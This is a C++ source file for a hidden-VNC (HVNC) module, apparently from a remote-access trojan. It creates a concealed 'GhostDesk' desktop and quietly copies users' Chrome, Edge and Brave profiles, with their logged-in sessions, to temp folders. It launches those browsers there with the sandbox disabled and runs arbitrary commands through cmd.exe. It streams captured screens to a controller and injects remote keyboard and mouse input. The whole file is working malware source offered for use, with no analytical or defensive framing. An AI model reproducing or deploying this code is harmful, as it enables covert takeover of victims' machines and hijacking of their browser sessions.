#include <windows.h>
#include <windowsx.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <algorithm>
#include <gdiplus.h>
#include <shlobj.h>
#include <shlwapi.h>
#include "core.h"

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")

using namespace Gdiplus;
using namespace std;

// --- HVNC Core ---

extern HDESK hOriginalDesk;
extern HDESK hHiddenDesk;
extern HANDLE hHVNCThread;
extern bool bHVNCRunning;
char g_hvnc_desktop_name[] = "GhostDesk";

extern int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);

// Window List
vector<HWND> g_hvnc_windows;

// Input State
POINT g_lastMouse = {0, 0};

// --- Utils for Browser Cloning ---

void CopyDir(const char* src, const char* dst) {
    char cmd[MAX_PATH * 4];
    // Use xcopy for simplicity in keeping directory structure
    sprintf(cmd, "xcopy /E /I /Y \"%s\" \"%s\"", src, dst);
    // Hide the console window of xcopy
    STARTUPINFOA si = {0}; si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000); // Wait up to 10s
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

void StartBrowser(const char* browserName, const char* exePath, const char* userDataPath) {
    char srcPath[MAX_PATH];
    char dstPath[MAX_PATH];
    char tempPath[MAX_PATH];
    
    // Resolve paths
    if (userDataPath) {
        ExpandEnvironmentStringsA(userDataPath, srcPath, MAX_PATH);
        GetTempPathA(MAX_PATH, tempPath);
        sprintf(dstPath, "%sGhost%s", tempPath, browserName);
        
        // Clone Profile (Essential for concurrent execution)
        CopyDir(srcPath, dstPath);
    } else {
        // Firefox/Others might handle profiles differently, simplified for now
        GetTempPathA(MAX_PATH, tempPath);
        sprintf(dstPath, "%sGhost%s", tempPath, browserName);
        CreateDirectoryA(dstPath, NULL);
    }

    char cmd[MAX_PATH * 2];
    if (userDataPath) {
        sprintf(cmd, "\"%s\" --user-data-dir=\"%s\" --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11", exePath, dstPath);
    } else {
        sprintf(cmd, "\"%s\"", exePath);
    }

    STARTUPINFOA si = { 0 }; si.cb = sizeof(si); 
    si.lpDesktop = g_hvnc_desktop_name; 
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_SHOWMAXIMIZED;
    PROCESS_INFORMATION pi = { 0 };
    
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
}

void StartChrome() {
    char path[MAX_PATH];
    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\Google\\Chrome\\Application\\chrome.exe", path, MAX_PATH);
    StartBrowser("Chrome", path, "%LOCALAPPDATA%\\Google\\Chrome\\User Data");
}

void StartEdge() {
    char path[MAX_PATH];
    ExpandEnvironmentStringsA("%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe", path, MAX_PATH);
    StartBrowser("Edge", path, "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data");
}

void StartBrave() {
    char path[MAX_PATH];
    ExpandEnvironmentStringsA("%ProgramFiles%\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", path, MAX_PATH);
    StartBrowser("Brave", path, "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data");
}

void StartFirefox() {
    char path[MAX_PATH];
    ExpandEnvironmentStringsA("%ProgramFiles%\\Mozilla Firefox\\firefox.exe", path, MAX_PATH);
    // Firefox profile cloning is complex (profiles.ini), using -no-remote -P to create new temp profile
    char cmd[MAX_PATH];
    sprintf(cmd, "\"%s\" -no-remote -CreateProfile \"GhostPanel\"", path);
    // Just try running with -no-remote, might open profile manager if lucky or default
    STARTUPINFOA si = { 0 }; si.cb = sizeof(si); si.lpDesktop = g_hvnc_desktop_name;
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
}

// --- Explorer Shell ---
void StartExplorer() {
    // 1. Tweak Registry to force taskbar behavior (TaskbarGlomLevel)
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        DWORD val = 2; 
        RegSetValueExA(hKey, "TaskbarGlomLevel", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }

    // 2. Launch Explorer
    char path[MAX_PATH];
    GetWindowsDirectoryA(path, MAX_PATH);
    strcat(path, "\\explorer.exe");
    
    STARTUPINFOA si = { 0 }; si.cb = sizeof(si); si.lpDesktop = g_hvnc_desktop_name;
    PROCESS_INFORMATION pi = { 0 };
    
    // Attempt to start explorer. In Win10+, it might delegate to main session, 
    // but running it on a separate desktop usually triggers a new instance if environment is right.
    if (CreateProcessA(path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }

    // 3. Force Taskbar State (ABM_SETSTATE) - Requires finding the window first
    // We wait a bit in the thread loop for it to appear
}

// --- Main HVNC ---

void InitHVNC() {
    if (hHiddenDesk) return;
    hOriginalDesk = GetThreadDesktop(GetCurrentThreadId());
    hHiddenDesk = CreateDesktopA(g_hvnc_desktop_name, NULL, NULL, 0, GENERIC_ALL, NULL);
    if (!hHiddenDesk) hHiddenDesk = OpenDesktopA(g_hvnc_desktop_name, 0, FALSE, GENERIC_ALL);
    if (hHiddenDesk) printf("[HVNC] Desktop Ready: %s\n", g_hvnc_desktop_name);
}

void ExecuteInHiddenDesk(const char* appCmd) {
    if (!hHiddenDesk) InitHVNC();

    if (strcmp(appCmd, "explorer") == 0) StartExplorer();
    else if (strcmp(appCmd, "chrome") == 0) StartChrome();
    else if (strcmp(appCmd, "edge") == 0) StartEdge();
    else if (strcmp(appCmd, "brave") == 0) StartBrave();
    else if (strcmp(appCmd, "firefox") == 0) StartFirefox();
    else {
        STARTUPINFOA si = { 0 }; si.cb = sizeof(si); si.lpDesktop = g_hvnc_desktop_name; 
        si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_SHOW;
        PROCESS_INFORMATION pi = { 0 };
        char cmd[512];
        if (strcmp(appCmd, "cmd") == 0) GetEnvironmentVariableA("ComSpec", cmd, 512);
        else sprintf(cmd, "cmd.exe /c %s", appCmd);
        
        if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        }
    }
}

// --- Capture ---

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    if (IsWindowVisible(hwnd)) g_hvnc_windows.push_back(hwnd);
    return TRUE;
}

void CaptureHVNC() {
    if (!hHiddenDesk) return;
    HDESK hOld = GetThreadDesktop(GetCurrentThreadId());
    if (!SetThreadDesktop(hHiddenDesk)) return;

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdcSc = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcSc);
    HBITMAP hBmp = CreateCompatibleBitmap(hdcSc, w, h);
    SelectObject(hdcMem, hBmp);

    // Background
    HBRUSH hBr = CreateSolidBrush(RGB(20, 20, 20));
    RECT rc = {0, 0, w, h};
    FillRect(hdcMem, &rc, hBr);
    DeleteObject(hBr);

    // Enum Windows
    g_hvnc_windows.clear();
    EnumDesktopWindows(hHiddenDesk, EnumWindowsProc, 0);
    std::reverse(g_hvnc_windows.begin(), g_hvnc_windows.end());

    for (HWND hwnd : g_hvnc_windows) {
        RECT r; GetWindowRect(hwnd, &r);
        // Correct negative coords (minimized or off-screen)
        if (r.right <= 0 || r.bottom <= 0 || r.left >= w || r.top >= h) continue;

        HDC hdcWin = CreateCompatibleDC(hdcSc);
        HBITMAP hBmpWin = CreateCompatibleBitmap(hdcSc, r.right - r.left, r.bottom - r.top);
        SelectObject(hdcWin, hBmpWin);
        
        // Try PrintWindow first (Good for hidden desktops)
        if (!PrintWindow(hwnd, hdcWin, 0)) {
             // Fallback
             HDC hRealWin = GetWindowDC(hwnd);
             BitBlt(hdcMem, r.left, r.top, r.right - r.left, r.bottom - r.top, hRealWin, 0, 0, SRCCOPY);
             ReleaseDC(hwnd, hRealWin);
        } else {
             BitBlt(hdcMem, r.left, r.top, r.right - r.left, r.bottom - r.top, hdcWin, 0, 0, SRCCOPY);
        }
        
        DeleteObject(hBmpWin);
        DeleteDC(hdcWin);
    }

    // Cursor - Ensure we draw it from current cursor pos
    CURSORINFO ci = { 0 }; ci.cbSize = sizeof(ci);
    if (GetCursorInfo(&ci) && ci.flags == CURSOR_SHOWING) {
        ICONINFO ii = { 0 };
        if (GetIconInfo(ci.hCursor, &ii)) {
            DrawIcon(hdcMem, ci.ptScreenPos.x - ii.xHotspot, ci.ptScreenPos.y - ii.yHotspot, ci.hCursor);
            if (ii.hbmMask) DeleteObject(ii.hbmMask); if (ii.hbmColor) DeleteObject(ii.hbmColor);
        }
    }

    // Send
    IStream* ps = NULL; CreateStreamOnHGlobal(NULL, TRUE, &ps);
    Bitmap* bmp = new Bitmap(hBmp, NULL);
    CLSID c; GetEncoderClsid(L"image/jpeg", &c);
    EncoderParameters ep; ep.Count = 1; ep.Parameter[0].Guid = EncoderQuality; ep.Parameter[0].Type = EncoderParameterValueTypeLong; ep.Parameter[0].NumberOfValues = 1; 
    ULONG q = 60; ep.Parameter[0].Value = &q;
    bmp->Save(ps, &c, &ep);
    
    LARGE_INTEGER lz = { 0 }; ULARGE_INTEGER pos; ps->Seek(lz, STREAM_SEEK_END, &pos); ps->Seek(lz, STREAM_SEEK_SET, NULL);
    DWORD sz = (DWORD)pos.QuadPart;
    if (sz > 0) {
        char* b = (char*)malloc(sz); ULONG br;
        ps->Read(b, sz, &br);
        SendPacket(TYPE_HVNC_FRAME, b, sz);
        free(b);
    }
    
    delete bmp; ps->Release(); DeleteObject(hBmp); DeleteDC(hdcMem); ReleaseDC(NULL, hdcSc);
    SetThreadDesktop(hOld);
}

DWORD WINAPI HVNCThread(LPVOID p) {
    if (!hHiddenDesk) InitHVNC();
    ExecuteInHiddenDesk("explorer"); // Try to start shell
    Sleep(2000); 
    while (bHVNCRunning) {
        CaptureHVNC();
        Sleep(100);
    }
    return 0;
}

void StartHVNC() {
    if (bHVNCRunning) return;
    bHVNCRunning = true;
    hHVNCThread = CreateThread(NULL, 0, HVNCThread, NULL, 0, NULL);
}

void StopHVNC() {
    bHVNCRunning = false;
    if (hHVNCThread) WaitForSingleObject(hHVNCThread, 1000);
}

// --- Input Injection ---

void HandleMouse(float rx, float ry, int flags) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int x = (int)(rx * w);
    int y = (int)(ry * h);
    POINT pt = {x, y};
    
    HWND hWnd = WindowFromPoint(pt);
    if (!hWnd) return;

    // Drill down
    POINT screenPt = pt;
    ScreenToClient(hWnd, &pt);
    HWND hChild = ChildWindowFromPoint(hWnd, pt);
    if (hChild && IsWindowVisible(hChild)) {
        hWnd = hChild;
        ScreenToClient(hWnd, &screenPt); // Recalculate for child
        pt = screenPt;
    }
    
    LPARAM lp = MAKELPARAM(pt.x, pt.y);

    if (flags & 1) { // LDown
        PostMessageA(hWnd, WM_LBUTTONDOWN, MK_LBUTTON, lp);
        // Simple drag support: If hit caption, try SC_MOVE. 
        // But simply posting LBUTTONDOWN often allows dragging in standard windows if handled correctly.
        // For standard caption dragging, we might need SendMessage(WM_SYSCOMMAND, SC_MOVE|HTCAPTION...)
        // But PostMessage LBUTTONDOWN is usually enough for controls.
        SetForegroundWindow(hWnd); 
    } else if (flags & 2) { // LUp
        PostMessageA(hWnd, WM_LBUTTONUP, 0, lp);
    } else if (flags & 4) { // RDown
        PostMessageA(hWnd, WM_RBUTTONDOWN, MK_RBUTTON, lp);
    } else if (flags & 8) { // RUp
        PostMessageA(hWnd, WM_RBUTTONUP, 0, lp);
    } else {
        PostMessageA(hWnd, WM_MOUSEMOVE, 0, lp);
    }
}

void HandleKey(int vk, int down) {
    HWND hWnd = GetForegroundWindow();
    // If no foreground on hidden desk, try to find one?
    // EnumWindows and take first?
    if (!hWnd && !g_hvnc_windows.empty()) hWnd = g_hvnc_windows.back(); 
    
    if (hWnd) {
        if (down) PostMessageA(hWnd, WM_KEYDOWN, vk, 0);
        else PostMessageA(hWnd, WM_KEYUP, vk, 0);
        if (down && vk == VK_RETURN) PostMessageA(hWnd, WM_CHAR, VK_RETURN, 0);
    }
}

void HandleHVNCInput(const char* data) {
    if (!hHiddenDesk) return;
    HDESK hOld = GetThreadDesktop(GetCurrentThreadId());
    SetThreadDesktop(hHiddenDesk);

    if (data[0] == 'K') {
        int vk, down;
        if (sscanf(data + 1, "%d,%d", &vk, &down) == 2) HandleKey(vk, down);
    } else {
        float rx, ry; int f;
        if (sscanf(data, "%f,%f,%d", &rx, &ry, &f) == 3) HandleMouse(rx, ry, f);
    }
    
    SetThreadDesktop(hOld);
}